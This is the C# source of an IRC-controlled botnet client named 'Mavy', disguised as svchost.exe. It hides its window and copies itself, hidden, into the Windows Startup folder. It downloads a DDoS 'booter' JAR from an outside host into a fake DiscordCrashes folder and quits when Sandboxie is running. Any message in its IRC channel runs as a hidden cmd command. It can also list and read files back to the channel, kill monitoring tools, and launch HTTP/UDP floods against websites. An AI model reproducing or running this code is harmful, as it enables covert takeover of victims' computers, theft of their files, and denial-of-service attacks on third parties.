using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using SimpleIRCLib;
using Thread_Basics;
using static SimpleIRCLib.SimpleIRC.JoinLeave;

namespace svchost
{
    
    /// <summary>
    /// Mavy main
    /// </summary>
    internal static class Program
    {
        
        #region Variables and API
        #region API
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion
        private static readonly string path = Assembly.GetExecutingAssembly().Location, mainDrive = $@"{Environment.GetEnvironmentVariable("SystemDrive")}\", startupPath = $@"{mainDrive}Users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
        private static readonly SimpleIRC irc = new SimpleIRC();
        private const string version = "XRAV-0.0.6";
        #endregion
        
        /// <summary>
        /// Apply a hide or normal attribute to a file.
        /// </summary>
        /// <param name="path"></param>
        /// <param name="hidden"></param>
        private static void HideUnhide(string path, bool hidden) => new FileInfo(path).Attributes = hidden ? FileAttributes.Hidden : FileAttributes.Normal;

        /// <summary>
        /// Main method which will be called whenever the program starts.
        /// </summary>
        private static void Main()
        {
            ShowWindow(GetConsoleWindow(), 0);
            Threader.CreateAndRunThread(() =>
            {
                try
                {
                    Console.Title = "\n";
                    #region File, Attributes and Networking
                    string temp = Path.GetTempPath(), vName = $@"{startupPath}\svchost.exe", fakeCrash = $@"{temp}\DiscordCrashes", jarPath = $@"{fakeCrash}\5352i.jar";
                    DeleteIfExists(jarPath);
                    if (!File.Exists(vName)) File.Copy(path, vName);
                    /* Fake DiscordCrashes directory */
                    Directory.CreateDirectory(fakeCrash);
                    Download("https://coffos.space/CFBooter.jar", jarPath);
                    HideUnhide(fakeCrash, true);
                    HideUnhide(vName, true);
                    #endregion
                    #region Anti Sandboxie
                    if (IsProcessActive("SbieCtrl"))
                    {
                        Environment.Exit(-1);
                        return;
                    }
                    #endregion
                    Console.Title = "Mavy | collecting slaves amount...";
                    #region ASCII
                    WriteColor("\n___  ___                  \n|  \\/  |                  \n| .  . | __ ___   ___   _ \n| |\\/| |/ _` \\ \\ / / | | |\n| |  | | (_| |\\ V /| |_| |\n\\_|  |_/\\__,_| \\_/  \\__, |\n                     __/ |\n                    |___/ \n", ConsoleColor.Red);
                    #endregion
                    #region IRC
                    irc.SetupIrc("irc.rizon.net", $"MavyClientRND{new Random().Next(782)}", "#CFBooter3925", 6697);
                    
                    var ic = irc.IrcClient;
                    ic.OnDebugMessage += DebugOutputCallback;
                    ic.OnMessageReceived += ChatOutputCallback;
                    ic.OnUserListReceived += UserListCallback;
                    irc.StartClient();
                    irc.SetJoinLeaveMessage(JOIN, $"Slave {Environment.UserName} joined.");
                    irc.SetJoinLeaveMessage(LEAVE, $"Slave {Environment.UserName} left.");
                    while (true)
                    {
                        var Input = Console.ReadLine()?
                            .Replace("kill", "taskkill /f /im")
                            .Replace("CFStart", $@"java -jar {Path.GetTempPath().Replace(":", ";")}DiscordCrashes\5352i.jar");
                        if (string.IsNullOrEmpty(Input) || !irc.IsClientRunning()) return;
                        irc.SendMessageToAll(Input);
                        #region Client commands
                        switch (Input.ToLower())
                        {
                            #region Ignore
                            default: break;
                            #endregion
                            case "$ mavy help":
                                WriteColor("─── MAVY ───", ConsoleColor.Red);
                                WriteColor("NOTICE: All : characters have to be replaced with ;", ConsoleColor.DarkYellow);
                                WriteColor("$ mavy list ─ List all active slaves.", ConsoleColor.Green);
                                WriteColor("$ mavy version ─ Make all slaves send the Mavy versions number in the console.", ConsoleColor.Green);
                                WriteColor("$ mavy panic ─ Panic close some processes.", ConsoleColor.Green);
                                WriteColor("$ mavy maindrive ─ Display all clients main drive.", ConsoleColor.Green);
                                WriteColor("$ mavy list maindrive ─ Display the folders in all clients main drive.", ConsoleColor.Green);
                                WriteColor("$ mavy dirlist <directory> #SlaveAgent ─ Displays all folders in the specified location on the specified slaves pc.", ConsoleColor.Green);
                                WriteColor("$ mavy filelist <directory> #SlaveAgent ─ Displays all folders in the specified location on the specified slaves pc.", ConsoleColor.Green);
                                WriteColor("kill <process-name>.exe ─ Force close the specified process using taskkill.", ConsoleColor.Green);
                                WriteColor("─── END MAVY ───\n", ConsoleColor.Red);
                                WriteColor("─── CFBOOTER ───", ConsoleColor.Red);
                                WriteColor("CFStart https;//url.com/ looptime(keep as 30) http-method cookie method(http;udp) port(udp-only) use-proxies(http-only[true/false]):BETA ─ Start attacking a website or a IP address.", ConsoleColor.Green);
                                WriteColor("CFStart usage example: CFStart https;//wweclient.com 30 GET DC1 http 0 false", ConsoleColor.Yellow);
                                WriteColor("─── END CFBOOTER ───", ConsoleColor.Red);
                                break;
                        }
                        #endregion
                    }
                    #endregion
                }
                catch (Exception) {Environment.Exit(-new Random().Next(2141251));}
            });
        }

        /// <summary>
        /// Delete a file if it exists.
        /// </summary>
        /// <param name="path"></param>
        private static void DeleteIfExists(string path)
        {
            if (File.Exists(path)) File.Delete(path);
        }

        /// <summary>
        /// Download a file from the specified url and put it in filePath.
        /// <para>EX: Download("https://example.com/a-text.file", "C:\filename.txt");</para>
        /// </summary>
        /// <param name="url"></param>
        /// <param name="filePath"></param>
        private static void Download(string url, string filePath)
        {
            using var client = new WebClient();
            client.DownloadFile(url, filePath);
        }

        /// <summary>
        /// Create a empty file then write whatever content you want in it.
        /// </summary>
        /// <param name="path"></param>
        /// <param name="content"></param>
        private static void CreateWithText(string path, string content)
        {
            File.Create(path).Close();
            File.WriteAllText(path, content);
        }

        /// <summary>
        /// Forces the specified process to close.
        /// </summary>
        /// <param name="processName"></param>
        private static void KillProcess(string processName) => Threader.CreateAndRunThread(() => {try {foreach (var proc in Process.GetProcessesByName(processName)) proc.Kill();} catch (Exception) {}});

        /// <summary>
        /// Force close Mavy if the specified process is active.
        /// </summary>
        /// <param name="processName"></param>
        private static void KillIfProcessAlive(string processName) => Threader.CreateAndRunThread(() => {try {if (IsProcessActive(processName)) Environment.Exit(-1);} catch (Exception) {}});

        /// <summary>
        /// Is the specified process active?
        /// </summary>
        /// <param name="processName"></param>
        /// <returns></returns>
        private static bool IsProcessActive(string processName) => Process.GetProcessesByName(processName).Length != 0;

        /// <summary>
        /// Run a CMD command, then wait 500ms before hiding it.
        /// </summary>
        /// <param name="command"></param>
        /// <param name="title"></param>
        /// <returns></returns>
        private static void ExecuteCommand(string command, string title = "") => Process.Start(new ProcessStartInfo("cmd") {Arguments = @"/k " + (title != "" ? $@"title {title} & {command.Replace(";", ":")} & pause" : $@"{command.Replace(";", ":")} & exit"), WindowStyle = ProcessWindowStyle.Hidden});

        /// <summary>
        /// Chat output callback.
        /// <para>Execute whatever the message consists of as a cmd command.</para>
        /// </summary>
        /// <param name="source"></param>
        /// <param name="args"></param>
        private static void ChatOutputCallback(object source, IrcReceivedEventArgs args)
        {
            string finalMessage = args.Message
                .Replace(";", ":")
                .Replace("kill", "taskkill /f /im")
                .Replace("CFStart", "start cmd /k java -jar CFBooter.jar"), 
                finalMessage_Lower = finalMessage.ToLower(),
                drive = $@"{mainDrive}:\";
            WriteColor($"* {args.User} -> {finalMessage}\n", ConsoleColor.Magenta);
            switch (finalMessage)
            {
                #region Ignore
                default: break;
                #endregion
                #region Client and Server
                #region Single
                case "$ mavy list":
                    irc.SendMessageToAll($"MAVY SLAVE CONNECTED [{Environment.UserName}]");
                    break;
                case "$ mavy version":
                    irc.SendMessageToAll(version);
                    break;
                case "$ mavy panic":
                    KillProcess("SbieCtrl");
                    KillProcess("ProcessMonitor");
                    KillProcess("ProcMon");
                    KillProcess("procmon");
                    KillProcess("ProcessHacker");
                    KillProcess("CheatEngine");
                    KillProcess("cmd");
                    KillProcess("taskmgr");
                    KillProcess("java");
                    KillProcess("javaw");
                    KillProcess("putty");
                    KillProcess("git");
                    break;
                case "$ mavy maindrive":
                    irc.SendMessageToAll(drive);
                    break;
                case "$ mavy list maindrive":
                    foreach (var dir in new DirectoryInfo("C:\\").GetDirectories()) irc.SendMessageToAll(dir.Name);
                    break;
                #endregion
            }
            #region Dynamic
            var userHash = $"#{Environment.UserName.ToLower()}";
            if (finalMessage_Lower.EndsWith(userHash))
            {
                if (finalMessage_Lower.Contains("$ mavy dirlist")) foreach (var dir in new DirectoryInfo(finalMessage_Lower.Replace("$ mavy dirlist ", "").Replace(userHash, "")).GetDirectories()) irc.SendMessageToAll(dir.Name.Replace(" \\", "\\"));
                if (finalMessage_Lower.Contains("$ mavy filelist")) foreach (var file in Directory.GetFiles(finalMessage_Lower.Replace("$ mavy filelist ", "").Replace(userHash, ""))) irc.SendMessageToAll($@"{file.Replace(":", ";").Replace(" \\", "\\")} #skipexec");
                if (finalMessage_Lower.Contains("$ mavy echo"))
                    if (File.Exists(finalMessage_Lower.Replace("$ mavy echo ", "").Replace(userHash, "")))
                    {
                        irc.SendMessageToAll("LISTING FILE CONTENT...");
                        irc.SendMessageToAll(File.ReadAllText(finalMessage_Lower.Replace("$ mavy echo ", "").Replace(userHash, "")) + " #skipexec");
                    }
            }
            #endregion
            #endregion
            if (finalMessage.Contains("#skipexec")) return; ExecuteCommand(finalMessage, finalMessage_Lower.Contains("java -jar") && finalMessage_Lower.Contains("5352i.jar") ? "XRAVE MAVY PX" : "");
        }

        /// <summary>
        /// Debug message callback.
        /// </summary>
        /// <param name="source"></param>
        /// <param name="args"></param>
        private static void DebugOutputCallback(object source, IrcDebugMessageEventArgs args) => WriteColor($"{args.Type} <*> {args.Message}", ConsoleColor.Red);

        /// <summary>
        /// User list callback.
        /// </summary>
        /// <param name="source"></param>
        /// <param name="args"></param>
        private static void UserListCallback(object source, IrcUserListReceivedEventArgs args)
        {
            foreach (var count in args.UsersPerChannel.Select(usersPerChannel => usersPerChannel.Value.Count))
                Console.Title = count <= 1
                    ? $"Mavy | [{count} slave connected, including you.]"
                    : $"Mavy | [{count} slaves connected, including you.]";
        }

        /// <summary>
        /// Print a message in the console with color.
        /// </summary>
        /// <param name="prn"></param>
        /// <param name="color"></param>
        private static void WriteColor(string prn, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(prn);
            Console.ResetColor();
        }
    }
}